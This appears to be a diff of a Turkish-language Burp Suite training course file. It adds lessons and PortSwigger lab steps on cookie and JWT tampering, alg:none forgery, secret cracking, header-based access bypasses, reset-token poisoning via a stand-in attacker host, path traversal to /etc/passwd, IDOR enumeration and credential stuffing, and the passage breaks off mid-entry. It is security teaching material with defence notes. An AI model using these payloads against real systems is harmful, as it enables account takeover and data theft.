@@ -2,131 +2,450 @@
   "id": "burpsuite",
   "slug": "burpsuite",
   "title": "Burp Suite",
-  "subtitle": "Web Uygulama Güvenliği için Kapsamlı Proxy Aracı",
-  "description": "Burp Suite, web uygulamalarının güvenlik testinde endüstri standardı olarak kabul gören entegre bir platform. Proxy, Scanner, Repeater, Intruder, Decoder ve daha fazlasını içerir.",
+  "subtitle": "HTTP'yi Kontrol Eden Kazanır — Proxy'den İleri Manipülasyona",
+  "description": "Burp Suite sadece bir proxy değil — HTTP trafiğini durdurup, değiştirip, yeniden şekillendirebildiğin bir silah. Header sahteciliği, JWT tampering, request smuggling, parametre kirliliği ve full web pentest zinciri.",
   "team": "red-team",
   "category": "Web Uygulama Güvenliği",
   "phase": "Interception / Exploitation",
   "icon": "🔥",
   "color": "#ff6633",
-  "tags": ["burpsuite", "proxy", "intercept", "repeater", "intruder", "web", "MITM"],
+  "tags": ["burpsuite", "proxy", "repeater", "intruder", "jwt", "request-smuggling", "header-injection", "idor", "hpp", "ssrf", "decoder", "extensions", "param-miner", "turbo-intruder"],
   "modules": [
     {
-      "id": "proxy-setup",
-      "title": "Proxy Kurulumu ve Temel Kullanım",
-      "description": "Burp Suite proxy'yi tarayıcıya bağla, HTTP trafiğini yakala ve incele.",
+      "id": "proxy-intercept",
+      "title": "Proxy & Intercept — Trafiği Kontrol Altına Al",
+      "description": "Burp'ü tarayıcıya bağla, HTTPS trafiğini aç, doğru filtrele ve Intercept ile HTTP diyaloğunu dondur.",
       "difficulty": "beginner",
-      "duration": "45 dk",
+      "duration": "30 dk",
       "sections": [
         {
-          "id": "theory",
+          "id": "burp-mimarisi",
           "type": "theory",
-          "title": "Burp Suite Nedir?",
-          "content": "Burp Suite, PortSwigger tarafından geliştirilen web uygulama güvenlik testi platformudur. İki sürümü vardır: Community (ücretsiz) ve Professional (ücretli).\n\nTemel modüller:\n- Proxy: Tarayıcı trafiğini araya girer ve düzenler\n- Repeater: HTTP isteklerini tekrar gönderir ve yanıtı analiz eder\n- Intruder: Otomatize parametre fuzzing ve brute force\n- Decoder: Veri encode/decode işlemleri\n- Comparer: İki yanıtı karşılaştırır\n- Scanner (Pro): Otomatize zafiyet taraması\n- Sequencer: Session token rastgelelik analizi\n\nBurp Suite, MITM (Man-in-the-Middle) proxy olarak çalışır. Tarayıcı ile web sunucusu arasına girerek tüm HTTP/HTTPS trafiğini yakalar, incelemenizi ve değiştirmenizi sağlar."
+          "title": "Burp Suite Mimarisi — MITM Proxy Nasıl Çalışır?",
+          "content": "Burp Suite, tarayıcı ile web sunucusu arasına **Man-in-the-Middle** olarak girer. Tarayıcı aslında Burp'e konuşur, Burp sunucuya iletir — her iki yöndeki trafiği görür, durdurur, değiştirir.\n\n```\nTarayıcı ──► Burp (127.0.0.1:8080) ──► Web Sunucu\n                    │\n                 [Intercept]\n                 [HTTP History]\n                 [Repeater]\n                 [Intruder]\n```\n\n**HTTPS için ne gerekir?** Burp kendi CA sertifikasıyla HTTPS trafiğini çözer. Tarayıcıya Burp CA'sını güvenilir olarak eklemezsen 'SSL error' alırsın.\n\n**Temel modüller:**\n| Modül | Amaç | Ne zaman kullanılır? |\n|-------|------|---------------------|\n| Proxy | Trafik yakalama/değiştirme | Her zaman açık |\n| HTTP History | Geçmiş tüm istekler | Keşif ve analiz |\n| Repeater | İstek tekrar gönderme | Zafiyet testi |\n| Intruder | Otomatik fuzzing/brute | Parametre ve auth testi |\n| Decoder | Encode/decode | Cookie, token analizi |\n| Comparer | İki yanıtı karşılaştır | IDOR, logic flaw tespiti |\n| Logger++ (ext) | Gelişmiş log | Büyük uygulamalar |\n| Sequencer | Token rastgelelik analizi | Session token zafiyeti |"
         },
         {
-          "id": "installation",
+          "id": "kurulum",
           "type": "installation",
-          "title": "Kurulum ve Proxy Yapılandırması",
+          "title": "Kurulum, CA Sertifikası ve FoxyProxy",
           "installation": {
-            "note": "Kali Linux'ta Burp Suite Community Edition önceden yüklüdür. Kurulum sonrası tarayıcı proxy ayarı gerekir.",
+            "note": "Kali Linux'ta Community Edition önceden gelir. HTTPS trafiği için CA sertifikası kurulumu zorunlu.",
             "linux": [
-              "# Kali'de başlatmak için:",
-              "burpsuite",
+              "burpsuite &",
               "",
-              "# Tarayıcı proxy ayarı (Firefox):",
-              "# Settings > Network Settings > Manual Proxy",
-              "# HTTP Proxy: 127.0.0.1  Port: 8080",
+              "# FoxyProxy kurulumu (Firefox eklentisi — önerilir):",
+              "# addons.mozilla.org > FoxyProxy Standard",
+              "# Ekle > Title: Burp | Proxy Type: HTTP | Host: 127.0.0.1 | Port: 8080",
               "",
-              "# CA sertifika kurulumu:",
-              "# Burp çalışırken Firefox'ta http://burp adresine git",
-              "# 'CA Certificate' indir ve Firefox'a import et"
+              "# CA Sertifikası kurulumu:",
+              "# 1. Burp açıkken Firefox'ta http://burp adresine git",
+              "# 2. 'CA Certificate' linkinden indir → cacert.der",
+              "# 3. Firefox: Settings > Privacy > View Certificates > Import",
+              "# 4. 'Trust this CA to identify websites' tikle",
+              "",
+              "# Artık https:// trafiği de yakalanır"
             ],
             "windows": [
-              "# portswigger.net/burp/communitydownload adresinden indirin",
-              "# Installer çalıştırın",
-              "# Aynı proxy ve sertifika kurulumu gereklidir"
+              "# portswigger.net/burp/communitydownload",
+              "# Aynı CA sertifika adımları — Windows için .p12 de çalışır"
             ]
           }
         },
         {
-          "id": "commands",
+          "id": "scope-filtre",
           "type": "commands",
-          "title": "Proxy ve Intercept Kullanımı",
+          "title": "Scope Ayarı — Sadece Hedefi Yakala",
           "commands": [
             {
-              "command": "# Intercept ON konumundayken bir web sayfasına git",
-              "description": "Proxy > Intercept sekmesinde 'Intercept is on' durumunda HTTP isteği yakalanır",
-              "output": "GET /login HTTP/1.1\nHost: hedef.com\nUser-Agent: Mozilla/5.0\nAccept: text/html\nCookie: session=abc123\nConnection: close",
-              "tip": "Yakalanan isteği 'Send to Repeater' (Ctrl+R) ile Repeater'a gönderin."
+              "command": "# Target > Scope > Add\n# Include in scope: https://hedef.com/*\n\n# HTTP History'yi sadece scope'a filtrele:\n# Filter bar > Show only in-scope items",
+              "description": "Scope tanımla — sadece hedef domainin trafiği History'de görünsün, geri kalan gürültü (Google Analytics, CDN vb.) süzülsün.",
+              "tip": "Scope dışındaki trafiği engellemek için: Proxy > Options > Intercept Client Requests > 'URL is in target scope' kuralı ekle."
             },
             {
-              "command": "# Repeater'da Request bölümüne ekle:",
-              "description": "Repeater — isteği tekrar gönder, parametreleri değiştir, yanıtı analiz et",
-              "output": "# Örnek: Cookie değerini değiştirip admin yetkisi almayı dene\nGET /admin HTTP/1.1\nHost: hedef.com\nCookie: role=admin; session=abc123\n\n# Send butonuna bas ve Response'u incele"
+              "command": "# Proxy > Intercept > Intercept is ON\n# Tarayıcıda hedef sayfaya git\n# Burp isteği dondurur — şimdi değiştirebilirsin\n\n# İsteği ilet: Forward\n# Yanıtı da yakala: Action > Do intercept > Response to this request",
+              "description": "Temel Intercept döngüsü — isteği dondur, değiştir, ilet. İstek YE Yanıt her ikisi de yakalanabilir.",
+              "output": "POST /login HTTP/2\nHost: hedef.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 35\n\nusername=user&password=wrongpass",
+              "tip": "Ctrl+F ile 'password' ara, değeri değiştir, Forward — tek tıkla test."
             }
           ]
         }
       ]
     },
     {
-      "id": "intruder-repeater",
-      "title": "Repeater ve Intruder Teknikleri",
-      "description": "Repeater ile manuel analiz, Intruder ile otomatize saldırılar gerçekleştir.",
+      "id": "http-manipulasyon",
+      "title": "HTTP İstek Manipülasyonu — Gerçek Saldırı Teknikleri",
+      "description": "Cookie tampering'den host header saldırısına, parametre kirliliğinden içerik tipi değiştirmeye — HTTP'nin her alanı bir saldırı yüzeyi.",
       "difficulty": "intermediate",
-      "duration": "70 dk",
+      "duration": "60 dk",
       "sections": [
         {
-          "id": "theory",
+          "id": "manipulasyon-temeli",
           "type": "theory",
-          "title": "Repeater vs Intruder",
-          "content": "Repeater: Tek bir isteği tekrar tekrar göndermenizi, her seferinde değişiklik yapmanızı sağlar. IDOR (Insecure Direct Object Reference) tespiti, parametre manipülasyonu ve bypass denemeleri için idealdir.\n\nIntruder: Belirli pozisyonlara (parametre, header, vb.) wordlist değerlerini otomatik yerleştirerek toplu test yapar. Brute force, fuzzing ve username enumeration için kullanılır.\n\nIntruder saldırı tipleri:\n- Sniper: Tek pozisyon, tek wordlist — en yaygın\n- Battering ram: Tüm pozisyonlara aynı değer\n- Pitchfork: Birden fazla pozisyona paralel liste\n- Cluster bomb: Tüm kombinasyonları dene (en kapsamlı)"
+          "title": "HTTP'de Neyi Manipüle Edebilirsin?",
+          "content": "HTTP bir metin protokolüdür — her satır değiştirilebilir. Saldırgan olarak şunları hedef alırsın:\n\n**İstek Anatomisi:**\n```\n[METHOD] [PATH] HTTP/1.1          ← Method tampering, path traversal\nHost: hedef.com                    ← Host header injection\nUser-Agent: Mozilla/5.0            ← Bot detection bypass\nX-Forwarded-For: 127.0.0.1        ← IP kısıtlama bypass\nX-Original-URL: /admin             ← Path kısıtlama bypass\nContent-Type: application/json     ← İçerik tipi manipülasyonu\nAuthorization: Bearer <JWT>        ← JWT tampering\nCookie: role=user; admin=false     ← Cookie manipülasyonu\nContent-Length: 42                 ← Request smuggling\n\n[BODY: parametre, JSON, XML]       ← Parametre kirliliği, injection\n```\n\n**Temel soru:** Sunucu bu alanlara güveniyor mu? Güveniyorsa — sömürülebilir.\n\n**Repeater bu yüzden kritik:** Her alanı değiştirip anında gönderip yanıtı karşılaştırmak, zafiyetin tam sınırını çizmenin tek yolu."
         },
         {
-          "id": "commands",
+          "id": "cookie-manipulasyon",
           "type": "commands",
-          "title": "Intruder ile Brute Force ve Fuzzing",
+          "title": "Cookie & Parametre Manipülasyonu",
           "commands": [
             {
-              "command": "# Intruder > Positions sekmesinde §parametreyi§ işaretle",
-              "description": "Login brute force — Sniper modu",
-              "output": "POST /login HTTP/1.1\nHost: hedef.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=§BURAYA_WORDLIST§\n\n# Payloads sekmesinde wordlist seç:\n# Payload type: Simple list\n# Load: /usr/share/wordlists/rockyou.txt (veya küçük liste)",
-              "warning": "Community Edition'da Intruder hız kısıtlaması var. Professional için Burp ya da alternatif olarak hydra kullanın."
+              "command": "# Yakalanan istekte Cookie header'ını bul:\nCookie: session=abc123; role=user; is_admin=false\n\n# Repeater'da değiştir:\nCookie: session=abc123; role=admin; is_admin=true",
+              "description": "Rol tabanlı yetki kontrolü client-side yapılıyorsa — cookie'deki role/is_admin değerini admin'e çevirmek yeterli.",
+              "output": "HTTP/2 200 OK\nContent-Type: text/html\n\n<h1>Admin Paneli</h1>\n<p>Hoş geldiniz, Yönetici!</p>",
+              "tip": "Base64 encode edilmiş cookie'ler için: Decoder > Decode as Base64 > düzenle > Encode as Base64 > kopyala yapıştır."
             },
             {
-              "command": "# HTTP History'den isteği sağ tıkla > Send to Intruder",
-              "description": "IDOR testi — user ID parametresini iteration ile değiştir",
-              "output": "GET /api/user/§1§/profile HTTP/1.1\n\n# Payload: Numbers 1-500\n# Sonuçta: boyut veya status kodu farklı olan satırlara dikkat et"
+              "command": "# Base64 cookie decode → manipüle → re-encode:\n# Decoder sekmesinde:\n# eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0=\n# Decode as Base64 → {\"user\":\"user\",\"role\":\"user\"}\n# Değiştir → {\"user\":\"user\",\"role\":\"admin\"}\n# Encode as Base64 → eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiJ9\n\n# Yeni değeri Cookie'ye yapıştır, Repeater'dan gönder",
+              "description": "Base64 cookie tampering — JSON tabanlı oturum verilerinde yaygın.",
+              "tip": "URL-encoded değerlerin içinde Base64 varsa önce URL decode et (Ctrl+Shift+U Decoder'da), sonra Base64 decode et."
+            },
+            {
+              "command": "# URL parametresi manipülasyonu:\n# Orijinal: GET /invoice?id=1042&user_id=583\n# Değiştir: GET /invoice?id=1042&user_id=1\n\n# POST body manipülasyonu:\n# Orijinal: amount=100&to_account=98765\n# Değiştir: amount=0.01&to_account=BENIM_HESABIM",
+              "description": "IDOR (Insecure Direct Object Reference) — başka kullanıcının ID'siyle kaynaklara eriş. Business logic — fiyat, miktar manipülasyonu.",
+              "warning": "amount=100 → amount=-100 gibi negatif değerler para transferi mantığını tersine çevirebilir — bazı uygulamalar bunu kontrol etmez."
             }
           ]
         },
         {
-          "id": "lab",
+          "id": "header-injection",
+          "type": "commands",
+          "title": "Header Injection Saldırıları",
+          "commands": [
+            {
+              "command": "# X-Forwarded-For ile IP kısıtlama bypass:\n# Orijinal istek 403 alıyor (IP whitelist)\n# Header ekle:\nX-Forwarded-For: 127.0.0.1\n\n# Veya farklı header isimleri:\nX-Real-IP: 127.0.0.1\nX-Client-IP: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nForwarded: for=127.0.0.1",
+              "description": "Bazı uygulamalar/proxy'ler X-Forwarded-For'u kaynak IP olarak kabul eder. 127.0.0.1 ya da kısıtlaması olmayan bir IP vermek erişim sağlayabilir.",
+              "output": "HTTP/2 200 OK  (önceki: 403 Forbidden)\n\n<h1>Admin Dashboard</h1>"
+            },
+            {
+              "command": "# X-Original-URL / X-Rewrite-URL ile path bypass:\n# GET / HTTP/1.1\n# X-Original-URL: /admin/panel\n\n# Alternatif:\n# GET /anything HTTP/1.1\n# X-Rewrite-URL: /admin/panel\n\n# Bazı framework'ler (Laravel, Spring) bu header'ları routing için kullanır",
+              "description": "WAF veya middleware /admin'i blokluyor ama backend routing X-Original-URL'e güveniyorsa — path kısıtlaması bypass.",
+              "tip": "PortSwigger Web Security Academy'de bu konuya özel lab var: 'Access control bypass via URL-based access control'."
+            },
+            {
+              "command": "# Host Header Saldırısı — Parola sıfırlama zehirleme:\n# Hedef: kurban@hedef.com parolasını sıfırla\n\n# İstek:\nPOST /forgot-password HTTP/1.1\nHost: saldirgan.com\n\nemail=kurban@hedef.com\n\n# Sunucu e-postadaki reset linkini Host header'ından üretirse:\n# → http://saldirgan.com/reset?token=GIZLITOKEN\n# Kurban tıkladığında token saldırgana gider",
+              "description": "Password reset poisoning — sunucu reset URL'ini Host header'ından oluşturuyorsa, Host'u kontrol ederek tokeni çalabilirsin.",
+              "output": "# Kurban aldığı email:\n# 'Şifrenizi sıfırlamak için tıklayın: http://saldirgan.com/reset?token=a1b2c3d4e5'\n# Kurban tıkladığında Burp Collaborator / ngrok loglarında token görünür",
+              "tip": "Collaborator Everywhere extension'ı tüm isteklere Collaborator URL'i ekler ve hangi parametreler sunucu tarafında çözümleniyorsa tespit eder."
+            },
+            {
+              "command": "# HTTP Method Tampering:\n# GET /admin/delete-user?id=5 HTTP/1.1 → 403\n# POST /admin/delete-user HTTP/1.1 → id=5 body'de → 200\n\n# HEAD metodu — yanıt body'si gelmiyor ama header'lar geliyor:\n# GET /admin → 403\n# HEAD /admin → 200 (bazı framework'lerde yetki kontrolü HEAD'i atlıyor)\n\n# OPTIONS — izin verilen metodları gör:\nOPTIONS / HTTP/1.1\n# Yanıt: Allow: GET, POST, PUT, DELETE, OPTIONS\n# DELETE /user/1 dene",
+              "description": "HTTP metod tamamen değiştir — GET'i POST'a, POST'u PUT'a. Bazı sunucular farklı metodlar için farklı yetki kuralları uygular (veya unutur).",
+              "tip": "Repeater'da Request'e sağ tıkla > 'Change request method' — Burp otomatik GET↔POST dönüşümü yapar (body ↔ query string)."
+            },
+            {
+              "command": "# Content-Type manipülasyonu — WAF bypass:\n# Orijinal (WAF engelliyor):\n# Content-Type: application/x-www-form-urlencoded\n# cmd=ls\n\n# JSON formatına geç:\n# Content-Type: application/json\n# {\"cmd\": \"ls\"}\n\n# XML formatına geç (XXE de deneyebilirsin):\n# Content-Type: application/xml\n# <?xml version='1.0'?><cmd>ls</cmd>\n\n# Multipart:\n# Content-Type: multipart/form-data; boundary=--xyz\n# ----xyz\n# Content-Disposition: form-data; name='cmd'\n# ls",
+              "description": "WAF genellikle belirli Content-Type'lar için imzalara sahiptir. Formatı değiştirmek imzayı atlatabilir, arka uç sunucu her iki formatı da kabul edebilir.",
+              "tip": "Content-Type: application/json gönderip body'de form-encoded veri gönder — bazı parser'lar karışır ve yanlış parse eder."
+            }
+          ]
+        },
+        {
+          "id": "hpp-path-traversal",
+          "type": "commands",
+          "title": "Parametre Kirliliği (HPP) ve Path Traversal",
+          "commands": [
+            {
+              "command": "# HTTP Parameter Pollution (HPP):\n# Bir parametreyi iki kez gönder:\nGET /transfer?to=KURBAN&amount=1000&to=BEN HTTP/1.1\n\n# PHP: son değeri alır → to=BEN\n# ASP.NET: ilk değeri alır → to=KURBAN\n# Node.js: array olarak alır → [KURBAN, BEN]\n# Framework farklılığı = zafiyet",
+              "description": "Aynı parametre adını iki kez gönder — sunucu hangisini alır? Çakışma iş mantığını bozabilir: transfer hedefi, fiyat, yetki bayrağı.",
+              "output": "# Test: ?debug=false&debug=true\n# Bazı uygulamalar hata ayıklama moduna girer\n# ?role=user&role=admin → admin kazanabilir"
+            },
+            {
+              "command": "# Path Traversal — dizin atlama:\n# GET /download?file=report.pdf\n# GET /download?file=../../../etc/passwd\n# GET /download?file=....//....//....//etc/passwd (double encoding bypass)\n\n# URL encode:\n# ../   →  %2e%2e%2f\n# /     →  %2f\n\n# Çift encode:\n# ../   →  %252e%252e%252f\n\n# Windows path:\n# ..\\  →  ..%5c\n# C:\\Windows\\System32\\drivers\\etc\\hosts",
+              "description": "Dosya indirme veya okuma parametrelerinde path traversal dene. WAF'lar ../  'yi bloklar — encoding ile atlatılır.",
+              "tip": "Repeater'da Ctrl+U → URL encode, Ctrl+Shift+U → URL decode. Çift encode için bir kez encode et, sonra tekrar encode et."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "jwt-tampering",
+      "title": "JWT Tampering — Token'ı Ele Geçir",
+      "description": "JSON Web Token'ların yapısını söküp yeniden imzala: alg:none saldırısı, HMAC brute force, RS256→HS256 confusion ve JWT Editor extension ile tam kontrol.",
+      "difficulty": "intermediate",
+      "duration": "45 dk",
+      "sections": [
+        {
+          "id": "jwt-theory",
+          "type": "theory",
+          "title": "JWT Anatomisi ve Neden Zayıflayabilir?",
+          "content": "JWT üç parçadan oluşur, nokta ile ayrılır:\n```\nHEADER.PAYLOAD.SIGNATURE\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2MDk0NTkwMDB9\n.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n```\n\n**Header** (Base64 decode): `{\"alg\": \"HS256\", \"typ\": \"JWT\"}`\n**Payload** (Base64 decode): `{\"sub\": \"user123\", \"role\": \"user\", \"iat\": 1609459000}`\n**Signature**: Header + Payload'ın gizli anahtar ile HMAC/RSA imzası\n\n**Zafiyet yüzeyleri:**\n| Saldırı | Ön Koşul | Etki |\n|---------|----------|------|\n| `alg: none` | Sunucu algoritma doğrulamazsa | İmzasız token kabul edilir |\n| RS256→HS256 confusion | Public key biliniyorsa | Public key ile HMAC imzala |\n| Zayıf secret brute force | Kısa/tahmin edilebilir secret | Kendi tokenim imzala |\n| `kid` header injection | SQL/path injection riski | Keystore kontrolü |\n| `jku` / `x5u` header | Harici key URL'i kontrol | Kendi public key'imizi sun |"
+        },
+        {
+          "id": "jwt-saldiri-komutlar",
+          "type": "commands",
+          "title": "JWT Saldırıları — alg:none, Brute Force, Confusion",
+          "commands": [
+            {
+              "command": "# JWT Editor extension kur: BApp Store > JWT Editor\n# Repeater'da token içeren isteği aç\n# JSON Web Token sekmesi görünür\n\n# 1. PAYLOAD'ı değiştir:\n# \"role\": \"user\" → \"role\": \"admin\"\n# \"sub\": \"user123\" → \"sub\": \"administrator\"\n# \"exp\": 1609459000 → 9999999999 (süresi uzat)",
+              "description": "JWT Editor extension — token'ı GUI ile düzenle, imzayı yeniden hesapla veya sil.",
+              "tip": "JWT Editor'ü BApp Store'dan kur: Extender > BApp Store > 'JWT Editor' ara > Install."
+            },
+            {
+              "command": "# alg:none saldırısı (imzasız token):\n# 1. Token'ı Decoder'da parçala:\n# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 → decode → {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n# 2. Header'ı değiştir:\n# {\"alg\":\"none\",\"typ\":\"JWT\"}\n# 3. Payload'ı değiştir:\n# {\"sub\":\"admin\",\"role\":\"admin\"}\n# 4. Her iki bölümü Base64 encode et (padding '=' OLMADAN!)\n# 5. Birleştir: HEADER.PAYLOAD. (son nokta sonrası signature boş!)\n\n# Sonuç:\n# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+              "description": "alg:none — bazı kütüphaneler algoritma 'none' olduğunda signature doğrulamasını atlar. Signature alanı tamamen boş bırakılır.",
+              "warning": "Base64 URL encoding kullanılır (standart değil): + yerine -, / yerine _, padding = karakterleri kaldırılır. jwt.io'da bu encode'u yapabilirsin.",
+              "output": "# Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.\n# Sunucu: 200 OK — Admin Dashboard"
+            },
+            {
+              "command": "# JWT Secret Brute Force (hashcat):\nhashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt\n\n# jwt-cracker (Node.js):\njwt-cracker -t 'eyJhbGci...' -w /usr/share/wordlists/rockyou.txt\n\n# john ile:\njohn --wordlist=rockyou.txt --format=HMAC-SHA256 token.txt",
+              "description": "HS256 JWT'leri brute force edilebilir — secret 'secret', 'password', 'jwt', şirket adı gibi kısa/tahmin edilebilir değerlerse kırılır.",
+              "output": "Session..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 16500 (JWT (JSON Web Token))\nRecovered........: 1/1\nSecret: mysecret\n\n# Artık herhangi bir payload'ı bu secret ile imzalayabilirsin"
+            },
+            {
+              "command": "# RS256 → HS256 Algorithm Confusion:\n# Sunucu RS256 (asimetrik) kullanıyor\n# Ancak RS256 doğrulamasını HS256 ile de yapıyorsa:\n# Public key'i HMAC secret olarak kullan!\n\n# 1. Public key'i al (genellikle /.well-known/jwks.json veya /jwks.json):\ncurl https://hedef.com/.well-known/jwks.json\n\n# 2. JWT Editor > New Symmetric Key > JWK formatında public key'i gir\n# 3. Algorithm'ı HS256 yap, payload'ı admin yap\n# 4. Bu public key ile imzala → sunucuya gönder",
+              "description": "RS256→HS256 confusion — sunucu gelen algoritma tipine göre doğrulama yaparsa, public key'i HS256 secret olarak kullanarak kendin imzalayabilirsin.",
+              "tip": "JWT Editor > New Symmetric Key > Key sekmesinde 'PEM' alanına sunucunun public key'ini yapıştır."
+            },
+            {
+              "command": "# kid (Key ID) Header Injection:\n# Bazı sunucular kid'i SQL sorgusuyla veritabanından key çekmek için kullanır\n\n# SQL Injection:\n# {\"alg\":\"HS256\",\"kid\":\"' UNION SELECT 'benim_secretim'--\"}\n# Sunucu 'benim_secretim' ile doğrulama yaparsa → aynı değerle token imzala\n\n# Path Traversal:\n# {\"alg\":\"HS256\",\"kid\":\"../../dev/null\"}\n# /dev/null boş string döner → boş secret ile HMAC → kırılabilir",
+              "description": "kid header manipülasyonu — key store'a injection ile doğrulama anahtarını kontrol et.",
+              "tip": "BApp Store'daki 'JSON Web Tokens (JWT4B)' extension bu saldırıları otomatik dener."
+            }
+          ]
+        },
+        {
+          "id": "jwt-lab",
           "type": "lab",
-          "title": "CTF Senaryosu: OWASP WebGoat — Session Hijacking",
+          "title": "Lab: JWT alg:none ile Admin Erişimi",
           "scenario": {
-            "title": "Cookie Manipülasyonu ve Yetki Yükseltme",
-            "objective": "Burp Suite ile normal kullanıcı oturumunu yakala, cookie değerlerini analiz et ve admin yetkisi elde et.",
-            "environment": "OWASP WebGoat (Docker) — localhost:8080/WebGoat",
+            "title": "JWT Algorithm Bypass",
+            "objective": "Uygulamada normal kullanıcı olarak giriş yap, JWT token'ını alg:none yöntemiyle manipüle et ve admin paneline eriş.",
+            "environment": "PortSwigger Web Security Academy: 'JWT authentication bypass via unverified signature' ve 'JWT authentication bypass via alg: none' lab'ları (ücretsiz)",
             "difficulty": "intermediate",
             "steps": [
-              "WebGoat'u başlat: docker run -p 8080:8080 webgoat/goat-and-wolf",
-              "Burp Proxy'yi aç ve tarayıcı ayarlarını yap",
-              "WebGoat'a normal kullanıcı olarak giriş yap",
-              "Giriş isteğini Burp Proxy'de yakala",
-              "Cookie değerlerini Decoder modülünde analiz et (Base64?)",
-              "role=user değerini role=admin ile değiştir",
-              "Repeater ile değiştirilmiş isteği gönder",
-              "Admin paneline erişim sağlandı mı kontrol et"
+              "Uygulamaya normal kullanıcı olarak giriş yap (wiener:peter)",
+              "Burp HTTP History'de Authorization header'ındaki JWT token'ı bul",
+              "Repeater'a gönder, JSON Web Token sekmesini aç (JWT Editor gerekli)",
+              "Payload'da 'sub' değerini 'administrator' ile değiştir",
+              "Header'da 'alg' değerini 'none' yap",
+              "JWT Editor > 'Sign' > 'Don't sign' (imzasız) seç",
+              "Değiştirilmiş token ile /admin endpoint'ine istek gönder",
+              "Admin paneline erişim doğrula, Carlos kullanıcısını sil"
             ],
             "hints": [
-              "Cookie'ler çoğu zaman Base64 encode edilir — Decoder > Decode as Base64",
-              "Bazı sistemler JWT kullanır — jwt.io ile parse et",
-              "Response'ta Set-Cookie header'larına dikkat et"
+              "JWT Editor extension kurulu değilse: Extender > BApp Store > JWT Editor",
+              "alg:none büyük/küçük harf duyarsız olabilir: 'None', 'NONE' de dene",
+              "Signature tamamen boş olmalı ama son nokta kalmalı: header.payload. (nokta silinmesin)"
             ],
-            "flag": "WebGoat{cookie_manipulation_success}",
-            "defenseNote": "Savunma: Cookie'lere HttpOnly ve Secure flag ekleyin. Yetki kontrollerini SADECE sunucu tarafında yapın, client-side değerlere güvenmeyin. JWT kullanan sistemlerde signature doğrulamasını ihmal etmeyin. Session token'ların rastgeleliğini ve süre sınırlamasını uygulayın."
+            "flag": "Lab tamamlandı işareti — PortSwigger arayüzünde 'Congratulations' mesajı",
+            "defenseNote": "JWT kütüphanesi 'none' algoritmasını asla kabul etmemeli. Algoritma client'tan geldiği gibi kullanılmamalı — sunucu tarafında sabit olmalı. jose, python-jwt gibi güncel kütüphanelerin bu güvenlik kontrolü varsayılan açıktır."
           }
+        }
+      ]
+    },
+    {
+      "id": "intruder-fuzzing",
+      "title": "Intruder & Repeater — Sistematik Fuzzing",
+      "description": "4 Intruder saldırı modu, Grep Match/Extract ile otomasyon, Turbo Intruder ile hız kısıtlamasını aş ve Param Miner ile gizli parametreleri keşfet.",
+      "difficulty": "intermediate",
+      "duration": "50 dk",
+      "sections": [
+        {
+          "id": "intruder-modlar",
+          "type": "theory",
+          "title": "4 Intruder Saldırı Modu",
+          "content": "Intruder'da önce § § işaretleriyle pozisyon belirlersin, sonra payload listesi seçersin.\n\n| Mod | Nasıl çalışır | Ne zaman? |\n|-----|--------------|----------|\n| **Sniper** | Tek pozisyon, sırayla her payload | Login brute, tek parametre fuzz |\n| **Battering Ram** | Tüm pozisyonlara aynı payload | Username=admin, password=admin |\n| **Pitchfork** | Liste1→Pos1, Liste2→Pos2 paralel | user1:pass1, user2:pass2 (credential stuffing) |\n| **Cluster Bomb** | Tüm kombinasyonlar | 10 user × 10 pass = 100 deneme |\n\n**Community Edition kısıtı:** Intruder Community'de kasıtlı yavaş çalışır (~1 req/sn). Çözümler:\n- **Turbo Intruder** extension (BApp Store) → 1000+ req/sn\n- **ffuf** veya **hydra** CLI alternatifleri\n- Professional lisansı"
+        },
+        {
+          "id": "intruder-komutlar",
+          "type": "commands",
+          "title": "Intruder Saldırıları — IDOR, Brute Force, Fuzzing",
+          "commands": [
+            {
+              "command": "# HTTP History > İstek > Sağ tık > Send to Intruder\n\n# Positions sekmesi:\nGET /api/invoice/§1042§ HTTP/2\nHost: hedef.com\n\n# Attack Type: Sniper\n# Payloads > Payload type: Numbers\n# From: 1 | To: 9999 | Step: 1\n\n# Başlat → farklı Content-Length veya Status'lu satırları filtrele",
+              "description": "IDOR testi — ID değerini 1'den 9999'e kadar otomatik dene, başka kullanıcıların verilerine eriş.",
+              "tip": "Options > Grep - Match: bölümüne 'invoice' ve 'Forbidden' ekle → iki sütun oluşur, hangisi erişilebilir anında görünür."
+            },
+            {
+              "command": "# Credential Stuffing — Pitchfork modu:\nPOST /login HTTP/1.1\n\nusername=§admin§&password=§password§\n\n# Payload set 1: usernames.txt (user listesi)\n# Payload set 2: passwords.txt (parola listesi)\n# Pitchfork: satır 1→satır 1, satır 2→satır 2 (HER BİR kullanıcı için kendi parolası)\n\n# Cluster Bomb ile tüm kombinasyonlar:\n# 100 user × 100 pass = 10.000 istek (yavaş ama kapsamlı)",
+              "description": "Pitchfork — sızdırılmış username:password çiftlerini test et. Cluster Bomb — tüm kombinasyonları tara (daha agresif).",
+              "warning": "Cluster Bomb çok fazla istek üretir. Lockout politikasını öğrenmeden kullanma. Community'de çok yavaş olur."
+            },
+            {
+              "command": "# Grep - Extract ile otomatik veri çıkarma:\n# Options > Grep - Extract > Add\n# Response'ta ilgilendiğin değeri seç (örn. CSRF token, fiyat)\n# Regex: <input name='csrf' value='([^']+)'>\n# Her istek için bu değeri ayrı sütunda gösterir\n\n# Grep - Match ile başarılı yanıtları filtrele:\n# 'Welcome' kelimesi varsa → başarılı login",
